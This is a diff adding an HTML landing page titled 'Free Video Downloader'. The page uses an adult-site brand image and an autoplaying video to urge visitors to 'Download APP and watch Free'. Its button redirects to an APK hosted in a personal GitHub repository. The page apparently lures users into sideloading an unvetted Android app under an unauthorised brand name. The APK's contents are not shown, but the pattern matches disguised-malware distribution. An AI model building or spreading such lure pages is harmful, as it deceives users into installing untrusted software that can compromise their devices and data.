@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    
+    <title>Free Video Downloader</title>
+    <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/ogshadow288/braza/refs/heads/main/favi.png">
+
+    <style>
+        html, body {
+            padding: 0;
+            margin: 0;
+            height: 100%;
+            font-family: Palatino, sans-serif;
+            color: #fff;
+            background: black;
+            text-align: center;
+        }
+
+        h2 {
+            text-align: center;
+        }
+
+        .img_1 {
+            width: 100%;
+        }
+
+        .video-container {
+            width: 430px;
+            height: 430px;
+            margin: 0 auto;
+            overflow: hidden;
+        }
+
+        video {
+            width: 100%;
+            height: 100%;
+            object-fit: fill; /* Video ko forcefully stretch karne ke liye */
+        }
+
+        .bt {
+            font-size: 20px;
+            margin: 20px auto;
+            display: block;
+            border-radius: 10px;
+            background-color: #ff9000;
+            color: #000;
+            font-weight: 700;
+            border: 2px solid #ff9000;
+            padding: 10px 20px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <img src="https://raw.githubusercontent.com/ogshadow288/braza/refs/heads/main/brazzers.png" class="img_1">
+
+    <div class="video-container">
+        <video muted autoplay loop playsinline id="video">
+            <source src="https://github.com/Technicalajoy/videos/raw/refs/heads/main/WhatsApp%20Video%202025-03-09%20at%2016.01.23_33c5d96c.mp4" type="video/mp4">
+        </video>
+    </div>
+
+    <h2>Download APP and watch Free</h2>
+    <button class="bt" id="downloadBtn">Download</button>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const video = document.getElementById("video");
+
+            // Try to autoplay the video
+            video.play().catch(error => console.error("Autoplay blocked:", error));
+
+            // Loop the video when it ends
+            video.addEventListener("ended", function () {
+                video.currentTime = 0;
+                video.play();
+            });
+
+            // Redirect when button is clicked
+            document.getElementById("downloadBtn").addEventListener("click", function () {
+                window.location.href = "https://github.com/ogshadow288/braza/raw/refs/heads/main/brazzers.apk";
+            });
+        });
+    </script>
+</body>
+</html>
